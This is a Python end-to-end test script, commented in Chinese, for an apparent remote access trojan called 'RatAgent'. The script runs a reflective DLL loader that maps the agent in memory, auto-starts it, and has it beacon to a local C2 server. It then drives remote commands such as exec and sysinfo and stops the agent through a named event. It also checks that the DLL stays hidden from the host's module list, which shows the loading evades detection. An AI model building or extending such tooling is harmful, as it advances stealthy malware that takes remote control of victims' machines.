# e2e_rdll.py — 反射加载(RfUdrl → runpic)验收
# 验证链路:Kali 上 `cpl link loader.spec RatAgent.sys.dll out.bin` 产出的 PIC,由
#   runpic 宿主执行 → RfUdrl 在进程内反射加载内嵌的 RatAgent.sys.dll(映射/重定位/
#   导入/TLS/异常目录)→ NtContinue 进 DllMain → 加载即自启 → beacon 上线 →
#   ratctl 交互(sessions/use/sysinfo/exec/screenshot)→ 跨进程命名事件优雅停止。
#
# 两个阶段:
#   P1 有 autostart.args(显式参数)→ 完整远控 + 跨进程优雅停止
#   P2 无 autostart.args          → 按内置默认配置自启(加载即自启的默认分支)
#   P3 autostart.args 为空文件    → 与"不存在"同样按内置默认配置自启
#
# 注意:自启是"加载即生效",所以 rundll32 的 Start/Stop 与它之间有 300ms 竞争窗口
# (见 client/core/agent_dll.cpp 文件头)。P1 的停止步骤把触发器留在原处,让 Stop
# 进程内的自启实例用同一份参数(同一个 agent_id),不影响对目标实例的跨进程停止验证。
#
# 前置(见 docs/PROGRESS.md §8.5):
#   build/e2e/out.bin                    ← Kali: scp DLL 上去后 cpl link
#   build/bin/c2server.exe / ratctl.exe
#   build/runpic/bin/runpic.exe          ← cmake -S tools/runpic -B build/runpic
#   build/dll-release/bin/RatAgent.sys.dll ← MSBuild RatAgent.sys.vcxproj -p:Configuration=Release
import os
import queue
import subprocess
import sys
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUT_BIN = os.path.join(ROOT, "build", "e2e", "out.bin")
RUNPIC = os.path.join(ROOT, "build", "runpic", "bin", "runpic.exe")
C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
DLL = os.path.join(ROOT, "build", "dll-release", "bin", "RatAgent.sys.dll")  # Release 形态
# 模块名必须与 DLL 的 RatAgentModuleId 一致(默认 sys)——它决定 id/日志/自启文件的文件名
# (见 client/core/module_id.h)
MODULE = "sys"
WORK = os.path.join(ROOT, "build", "e2e")
AGENT_ID = os.path.join(WORK, f"{MODULE}.id")
AGENT_LOG = os.path.join(WORK, f"{MODULE}.log")
RUNPIC_LOG = os.path.join(WORK, "runpic.log")
C2_LOG = os.path.join(WORK, "c2server.log")
SHOT = os.path.join(WORK, "shot.jpg")

# 把子进程的 LOCALAPPDATA 指进工作区:默认路径(<module>.autostart.args / .id / .log)
# 落在可写且可查的位置,触发器路径随之确定(不必再去挑 %TEMP%)。
HOME = os.path.join(WORK, "home")
TRIGGER = os.path.join(HOME, "RatAgent", f"{MODULE}.autostart.args")
DEFAULT_ID = os.path.join(HOME, "RatAgent", f"{MODULE}.id")
DEFAULT_LOG = os.path.join(HOME, "RatAgent", f"{MODULE}.log")


def fwd(p):
    """Windows 路径 → 正斜杠(拼参数串用)。"""
    return p.replace(os.sep, "/")


CHILD_ENV = dict(os.environ)
CHILD_ENV["LOCALAPPDATA"] = HOME

ok = True


def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond:
        ok = False


def read_text(path, wait_s=0.0):
    """读取文本;先等 wait_s 让写入方落盘。文件不存在返回空串。"""
    if wait_s > 0:
        t0 = time.time()
        while time.time() - t0 < wait_s and not os.path.exists(path):
            time.sleep(0.2)
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


class Shell:
    """交互式 ratctl 会话:stdin 发命令,读线程收集 stdout。"""

    def __init__(self):
        self.proc = subprocess.Popen([RATCTL, "-s", "127.0.0.1:4444"],
                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT,
                                     encoding="utf-8", errors="replace", bufsize=1,
                                     cwd=ROOT, env=CHILD_ENV)
        self.q = queue.Queue()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        for line in self.proc.stdout:
            self.q.put(line)

    def drain(self):
        out = ""
        while True:
            try:
                out += self.q.get_nowait()
            except queue.Empty:
                break
        return out

    def send(self, cmds, wait):
        for c in cmds:
            self.proc.stdin.write(c + "\n")
            self.proc.stdin.flush()
        time.sleep(wait)
        return self.drain()

    def close(self):
        try:
            self.proc.stdin.close()
            self.proc.wait(timeout=3)
        except Exception:
            self.proc.kill()


def process_modules(pid):
    """用 EnumProcessModulesEx 列出进程已加载模块名。

    反射加载不会把 RatAgent.sys.dll 挂进宿主模块表(它不在 loader 链表里),而
    LoadLibrary 会 —— 这是区分"反射加载"和"普通加载"的硬证据。
    枚举失败返回 None(检查降级为 warn,不影响结论)。
    """
    try:
        import ctypes
        from ctypes import wintypes

        PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, LIST_MODULES_ALL = 0x0400, 0x0010, 0x03
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        psapi = ctypes.WinDLL("psapi", use_last_error=True)
        # 必须声明 argtypes:否则 64 位 HMODULE 会按 32 位 int 转换而溢出
        k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        k32.OpenProcess.restype = wintypes.HANDLE
        k32.CloseHandle.argtypes = [wintypes.HANDLE]
        psapi.EnumProcessModulesEx.argtypes = [wintypes.HANDLE,
                                               ctypes.POINTER(wintypes.HMODULE),
                                               wintypes.DWORD,
                                               ctypes.POINTER(wintypes.DWORD),
                                               wintypes.DWORD]
        psapi.EnumProcessModulesEx.restype = wintypes.BOOL
        psapi.GetModuleBaseNameW.argtypes = [wintypes.HANDLE, wintypes.HMODULE,
                                             wintypes.LPWSTR, wintypes.DWORD]
        psapi.GetModuleBaseNameW.restype = wintypes.DWORD
        h = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, False, pid)
        if not h:
            return None
        try:
            arr = (wintypes.HMODULE * 2048)()
            need = wintypes.DWORD()
            if not psapi.EnumProcessModulesEx(h, arr, ctypes.sizeof(arr),
                                              ctypes.byref(need), LIST_MODULES_ALL):
                return None
            n = need.value // ctypes.sizeof(wintypes.HMODULE)
            names = []
            for i in range(n):
                buf = ctypes.create_unicode_buffer(260)
                if psapi.GetModuleBaseNameW(h, arr[i], buf, 260):
                    names.append(buf.value)
            return names
        finally:
            k32.CloseHandle(h)
    except Exception:
        return None


def registered_count():
    """c2server 日志里 beacon 注册次数(用来按阶段区分 agent)。"""
    return read_text(C2_LOG).count("registered (first GET)")


def main():
    os.makedirs(WORK, exist_ok=True)

    # 0) 前置产物
    for p in (OUT_BIN, RUNPIC, C2, RATCTL, DLL):
        check(f"prereq {os.path.relpath(p, ROOT)}", os.path.exists(p))
    if not ok:
        print("== RESULT: PREREQ MISSING")
        sys.exit(1)

    # 1) 清理旧状态(workspace 内 id/log/截屏 + 默认目录下的触发器/id/log)
    for f in (AGENT_ID, AGENT_LOG, RUNPIC_LOG, C2_LOG, SHOT,
              TRIGGER, DEFAULT_ID, DEFAULT_LOG):
        if os.path.exists(f):
            os.remove(f)

    srv = None
    runpic = None
    sh = None
    p2 = None
    p3 = None
    try:
        # 2) C2 服务器(日志落盘)
        with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT,
                                   cwd=ROOT, env=CHILD_ENV)
        time.sleep(1)

        # ---- P1:触发器文件(显式参数) ----
        # 3) 触发器内容 = 参数串;DllMain 检测到即在自建线程启动
        os.makedirs(os.path.dirname(TRIGGER), exist_ok=True)
        args = f"127.0.0.1,8080,-s,2,id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"
        with open(TRIGGER, "w", encoding="utf-8") as f:
            f.write(args)

        # 4) runpic 执行 PIC(--hold -1 无限驻留)
        with open(RUNPIC_LOG, "w", encoding="utf-8", errors="replace") as f:
            runpic = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
                                      stdout=f, stderr=subprocess.STDOUT,
                                      cwd=ROOT, env=CHILD_ENV)

        # 5) 等 agent.id(反射加载 + 入口点 + 自启动完成的硬标志)
        t0 = time.time()
        while time.time() - t0 < 30 and not os.path.exists(AGENT_ID):
            time.sleep(0.5)
        check("agent.id 生成(反射加载+DllMain 自启动)", os.path.exists(AGENT_ID),
              f"{time.time() - t0:.1f}s")

        # 宿主输出与 DLL 输出可能落在不同文件:有控制台时 DLL 不做重定向、两者都走
        # 宿主 stdout;无控制台时 DLL 会 freopen 抢占 stdout、宿主后续输出也进日志。
        # 因此合并两边判断。
        def combined_text():
            return read_text(RUNPIC_LOG) + read_text(AGENT_LOG)

        t0 = time.time()
        while time.time() - t0 < 10:
            if "loader thread exited" in combined_text():
                break
            time.sleep(0.5)
        combined = combined_text()
        check("PIC 读入并映射", "pic mapped at" in combined, repr(combined[:160]))
        check("loader 线程完成(DllMain 经合成栈返回)", "loader thread exited" in combined,
              repr(combined[-160:]))

        t0 = time.time()
        while time.time() - t0 < 15:
            if "[beacon] started" in combined_text():
                break
            time.sleep(0.5)
        combined = combined_text()
        check("autostart 触发器命中", "autostart trigger" in combined)
        check("beacon 已启动", "[beacon] started" in combined,
              repr(combined[-160:]))

        # 反射加载 vs LoadLibrary 的硬证据:宿主模块表里没有 RatAgent.sys.dll
        mods = process_modules(runpic.pid)
        if mods is not None:
            check("宿主模块表无 RatAgent.sys.dll(确为反射加载)", "RatAgent.sys.dll" not in mods,
                  f"modules={len(mods)}")
        else:
            print("[warn] 枚举宿主模块失败,跳过模块表检查")

        # 6) ratctl 交互(命令经 beacon GET 下发、结果经 POST 回传)
        sh = Shell()
        out1 = sh.send(["sessions"], 6)
        aid = ""
        for line in out1.splitlines():
            parts = line.split()
            if parts and len(parts[0]) == 32 and all(c in "0123456789abcdef" for c in parts[0]):
                aid = parts[0]
                break
        check("sessions 列出反射加载的 agent", len(aid) == 32, aid)

        out2 = sh.send(["use " + aid, "sysinfo"], 10)
        check("use 切换 + 提示符", "ratctl[" in out2 and "switched" in out2)
        check("sysinfo 回传", "OS:" in out2 and "HOST:" in out2, repr(out2[-100:]))

        marker = "rdll-reflective-ok"
        out3 = sh.send([f"exec echo {marker}"], 10)
        check("exec 回传", marker in out3, repr(out3[-100:]))

        # 截屏/屏幕流（0x1001/0x1002）已在模块化阶段 2 移到 screen 模块，
        # full 不再提供；这里改为验证"确实没有"，能力覆盖见 scripts/e2e_screen.py
        out4 = sh.send(["raw 1001"], 10)
        check("sys 已无 0x1001（阶段2 拆到 screen 模块）",
              "status : 0x01" in out4, repr(out4[-90:]))
        sh.close()
        sh = None

        # 7) 跨进程优雅停止:磁盘 DLL 的 Stop 导出 → 命名事件 → 反射加载实例退出
        #    注意:自启现在是"加载即生效"(没有触发器文件就用默认配置),所以 Stop 进程
        #    里的自启无法用"删文件"来抑制。这里把触发器**留在原处**,让 Stop 进程内的
        #    自启实例用同一份参数(同一个 agent_id),从而不影响对目标实例的跨进程停止。
        #    已知代价:Stop 进程会短暂多出一个"幻影 agent"(rundll32 退出即消失)。
        stop = subprocess.run(
            ["rundll32", f"{DLL},Stop", f"id={fwd(AGENT_ID)},log={fwd(AGENT_LOG)}"],
            capture_output=True, timeout=30, env=CHILD_ENV)
        check("Stop 调用返回", stop.returncode == 0)
        t0 = time.time()
        while time.time() - t0 < 15:
            if "[beacon] stopped" in combined_text():
                break
            time.sleep(0.5)
        alog = combined_text()
        # rundll32 宿主无控制台 → Stop 的输出走 log= 指定的文件
        check("signalled 命中事件", "-> signalled" in alog)
        check("agent 优雅停止", "[beacon] stopped" in alog, repr(alog[-200:]))

        # ---- P2:无 autostart.args → 按内置默认配置自启(新行为) ----
        runpic.kill()
        runpic.wait(timeout=5)
        if os.path.exists(TRIGGER):
            os.remove(TRIGGER)
        # 默认目录要先在:P1 写过触发器所以它已存在;这里显式建一次,保证单独跑 P2 也成立
        os.makedirs(os.path.dirname(TRIGGER), exist_ok=True)
        before = registered_count()
        p2_log = os.path.join(WORK, "runpic_p2.log")
        with open(p2_log, "w", encoding="utf-8", errors="replace") as f:
            p2 = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
                                  stdout=f, stderr=subprocess.STDOUT,
                                  cwd=ROOT, env=CHILD_ENV)
        t0 = time.time()
        while time.time() - t0 < 20 and not os.path.exists(DEFAULT_ID):
            time.sleep(0.5)
        p2_txt = read_text(p2_log)
        check("P2 loader 正常执行", "loader thread exited" in p2_txt, repr(p2_txt[-120:]))
        check("P2 无触发器:默认 id 落盘", os.path.exists(DEFAULT_ID), fwd(DEFAULT_ID))
        check("P2 无触发器:走默认配置分支",
              "autostart (no trigger -> default config)" in p2_txt, repr(p2_txt[-160:]))
        t0 = time.time()
        while time.time() - t0 < 20 and registered_count() <= before:
            time.sleep(0.5)
        check("P2 无触发器:默认 beacon 上线", registered_count() > before,
              f"registered={registered_count()} before={before}")

        # ---- P3:autostart.args **存在但内容为空** → 与"文件不存在"同样走默认配置 ----
        #     (旧行为:空文件也算"触发了",日志说 trigger 但实际用默认值;现在两者语义一致)
        if p2 and p2.poll() is None:
            p2.kill()
            p2.wait(timeout=5)
        if os.path.exists(DEFAULT_ID):
            os.remove(DEFAULT_ID)          # 让"默认 id 重新落盘"这一步有观测意义
        with open(TRIGGER, "w", encoding="utf-8"):
            pass                            # 建一个**空**触发器文件
        before3 = registered_count()
        p3_log = os.path.join(WORK, "runpic_p3.log")
        with open(p3_log, "w", encoding="utf-8", errors="replace") as f:
            p3 = subprocess.Popen([RUNPIC, OUT_BIN, "--hold", "-1"],
                                  stdout=f, stderr=subprocess.STDOUT,
                                  cwd=ROOT, env=CHILD_ENV)
        t0 = time.time()
        while time.time() - t0 < 20 and not os.path.exists(DEFAULT_ID):
            time.sleep(0.5)
        p3_txt = read_text(p3_log)
        check("P3 loader 正常执行", "loader thread exited" in p3_txt, repr(p3_txt[-120:]))
        check("P3 空触发器:仍走默认配置(未被当成触发)",
              "autostart (no trigger -> default config)" in p3_txt, repr(p3_txt[-200:]))
        check("P3 空触发器:日志点明原因",
              "is empty -> treated as no trigger" in p3_txt, repr(p3_txt[-200:]))
        check("P3 空触发器:默认 id 落盘", os.path.exists(DEFAULT_ID), fwd(DEFAULT_ID))
        t0 = time.time()
        while time.time() - t0 < 20 and registered_count() <= before3:
            time.sleep(0.5)
        check("P3 空触发器:默认 beacon 上线", registered_count() > before3,
              f"registered={registered_count()} before={before3}")
    finally:
        # 8) 收尾:杀宿主与服务器(触发器文件保留与否已不影响行为,顺手清掉)
        if sh:
            sh.close()
        try:
            if os.path.exists(TRIGGER):
                os.remove(TRIGGER)
        except OSError:
            pass
        for proc in (runpic, p2, p3):
            if proc and proc.poll() is None:
                proc.kill()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    pass
        if srv:
            srv.terminate()
            try:
                srv.wait(timeout=5)
            except subprocess.TimeoutExpired:
                srv.kill()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
